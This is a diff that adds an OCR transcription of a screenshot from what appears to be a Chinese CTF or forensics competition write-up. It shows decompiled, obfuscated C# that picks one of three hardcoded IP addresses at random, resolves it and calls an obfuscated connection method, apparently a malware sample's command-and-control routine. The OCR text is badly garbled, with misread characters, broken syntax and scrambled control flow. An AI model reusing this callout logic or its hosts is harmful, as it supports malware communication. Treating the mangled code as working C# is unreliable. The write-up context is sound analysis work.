@@ -1,0 +1,27 @@
+# OCR: Pasted_image_20260416001055.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260416001055.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:45
+
+22 23 24 25 26
+27 28 29 30 31 32 33 34
+35 36 37 38 39 40 41 42 43 44 45 46 47
+48 49 50 5
+pub1lic static void u97060VQm3F7ADJJyDV85Ea70QFIveDAEfezQ8YXy7JEm0WUrIUs6v97sMf4cGt3Y8K9zXPDvKXTgvtlmqq18QcZG9oQ()
+try
+string text = statics. 156. 238. 239. 253, 66.175.239.149, 185.117.249.43.Sp1it(new charLJ t ,  J  lnew Random(.Next(statics. 156. 238. 239. 253, 66.175.239. 149, 185. 117.249. 43.Sp1it(new char
+「’
+,’}).Length)
+if(AcX0gTJzEzq40gP5gFxb.xc6H8c9Pbg8tjwXdpwk(text)
+IPAddressL] hostAddresses = Dns.GetHostAddresses(text) foreachIPaddressipaddress in hostAddresses
+try
+MUaD1UN9X5rN98KUAn5WbH3KQZ85RCCg3gIDL08mHgWgZYUPKBUWI2vuwanlzJDsD93oLEVaFhmWRM9urmZakxV.2SVwEro2tzHaiAM0JKaVg4muGfVKnEp6d3ryS67P1m7yC3BQab0nh7TShrw3hnHbN6DbQgg.jXP7s60jYcz1vLbC1DAR(ipaddress.TostringO)
+if
+MUaD1UN9X5rN98KUAn5WbH3K0Z85RyCCg3gIDoL08mHgWogZYUPKBUWIW2vuwanlzJDsD93oLEVavFhmWRM9urnZakxV.gmC4seKwT67zDBQdgKSaPDpaypoVwopRxAoFLfZGJO7zUgVVgoXbySebonY1wg1LHiwbKvMw
+co1D1Q6Da88Q5HFju8iU break:
+catch
+else
+(Exception ex)
+MUaD1UN9X5rN98KUAn5WbH3K0Z85RyCCg3gIDoL08mHgWgZYUPKBUWIW2vuWanlzJDsD93LEVavFhmWRM9urnZakxV.2SVwEro2tzHaiAM0JKaVg4muGfVKnEp6d3rS67P1m7C3BQab0nh7TShrw3hnHbN6DbQgg.jXP7s60jYcz1vLbC1DARm(text)
+(Exception ex2)
+catch
